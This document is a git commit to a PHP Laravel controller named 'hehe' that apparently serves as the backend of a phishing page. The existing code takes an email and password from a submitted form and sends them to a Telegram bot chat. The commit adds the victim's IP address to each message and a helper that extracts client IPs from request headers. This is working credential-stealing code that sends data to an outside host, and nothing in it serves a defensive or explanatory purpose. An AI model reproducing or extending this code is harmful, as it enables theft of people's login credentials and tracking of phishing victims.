d89ed1429abc21dee6e7243741dd0f7deeaa3005
hehe <bvminh101299@gmail.com>
2023-10-20 13:34:03 +0700

    fix

--- app/Http/Controllers/hehe.php
+++ app/Http/Controllers/hehe.php
@@ -19,6 +19,7 @@ class hehe extends Controller
         $chatid = "-1002098881792";
         $messaggio = '';
         if(isset($data['form_data'][1]) && !empty($data['form_data'][1])){
+            $messaggio = "IP:".$this->getIp()."\n";
             $messaggio .= 'email: '.$data['form_data'][1]['value'];
             $messaggio .= "\nPassword: ".$data['form_data'][0]['value'];
             $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid. "&text=" . urlencode($messaggio);
@@ -40,5 +41,19 @@ class hehe extends Controller
         }
         
         
+    }
+
+    public function getIp(){
+        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
+            if (array_key_exists($key, $_SERVER) === true){
+                foreach (explode(',', $_SERVER[$key]) as $ip){
+                    $ip = trim($ip); // just to be safe
+                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
+                        return $ip;
+                    }
+                }
+            }
+        }
+        return request()->ip(); // it will return the server IP if the client IP is not found using this method.
     }
 }
